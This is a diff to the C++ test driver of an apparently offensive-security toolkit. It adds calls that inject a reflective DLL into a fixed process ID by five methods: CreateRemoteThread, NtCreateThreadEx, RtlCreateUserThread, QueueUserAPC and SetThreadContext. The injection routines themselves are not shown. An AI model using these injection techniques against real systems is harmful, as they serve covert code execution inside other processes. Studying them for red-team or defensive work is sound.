@@ -246,6 +246,8 @@ void test_spawn()
 	}
 	*/
 
+	printf("Reflective Injection : CreateRemoteThread\n");
+
 	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
 	// get length of file:
 	is.seekg(0, std::ios::end);
@@ -257,7 +259,99 @@ void test_spawn()
 	is.read(buffer, length);
 	is.close();
 
-	bool success = spawn.reflective_injection(33536, buffer, length);
+	bool success = spawn.reflective_injection_CreateRemoteThread(7992, buffer, length);
+	if (success)
+	{
+		printf("Successfully injected into the process\n");
+	}
+	else
+	{
+		printf("Failed to inject in the process: %d\n", GetLastError());
+	}
+
+	printf("Reflective Injection : NtCreateThreadEx\n");
+
+	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
+	// get length of file:
+	is.seekg(0, std::ios::end);
+	length = is.tellg();
+	is.seekg(0, std::ios::beg);
+	// allocate memory:
+	buffer = new char[length];
+	// read data as a block:
+	is.read(buffer, length);
+	is.close();
+
+	success = spawn.reflective_injection_NtCreateThreadEx(7992, buffer, length);
+	if (success)
+	{
+		printf("Successfully injected into the process\n");
+	}
+	else
+	{
+		printf("Failed to inject in the process: %d\n", GetLastError());
+	}
+
+	printf("Reflective Injection : pfnRtlCreateUserThread\n");
+
+	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
+	// get length of file:
+	is.seekg(0, std::ios::end);
+	length = is.tellg();
+	is.seekg(0, std::ios::beg);
+	// allocate memory:
+	buffer = new char[length];
+	// read data as a block:
+	is.read(buffer, length);
+	is.close();
+
+	success = spawn.reflective_injection_pfnRtlCreateUserThread(7992, buffer, length);
+	if (success)
+	{
+		printf("Successfully injected into the process\n");
+	}
+	else
+	{
+		printf("Failed to inject in the process: %d\n", GetLastError());
+	}
+
+	printf("Reflective Injection : QueueUserAPC\n");
+
+	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
+	// get length of file:
+	is.seekg(0, std::ios::end);
+	length = is.tellg();
+	is.seekg(0, std::ios::beg);
+	// allocate memory:
+	buffer = new char[length];
+	// read data as a block:
+	is.read(buffer, length);
+	is.close();
+
+	success = spawn.reflective_injection_QueueUserAPC(7992, buffer, length);
+	if (success)
+	{
+		printf("Successfully injected into the process\n");
+	}
+	else
+	{
+		printf("Failed to inject in the process: %d\n", GetLastError());
+	}
+
+	printf("Reflective Injection : SetThreadContext\n");
+
+	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
+	// get length of file:
+	is.seekg(0, std::ios::end);
+	length = is.tellg();
+	is.seekg(0, std::ios::beg);
+	// allocate memory:
+	buffer = new char[length];
+	// read data as a block:
+	is.read(buffer, length);
+	is.close();
+
+	success = spawn.reflective_injection_SetThreadContext(7992, buffer, length);
 	if (success)
 	{
 		printf("Successfully injected into the process\n");
@@ -284,7 +378,6 @@ int main()
 	printf("\n==========================================\n\n");
 
 	listProcesses();
-	*/
 
 	printf("\n==========================================\n\n");
 
@@ -296,11 +389,11 @@ int main()
 
 	printf("\n==========================================\n\n");
 
-	/*
+	*/
+
 	test_spawn();
 
 	Sleep(10 * 1000);
-	*/
 }
 
 int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance,
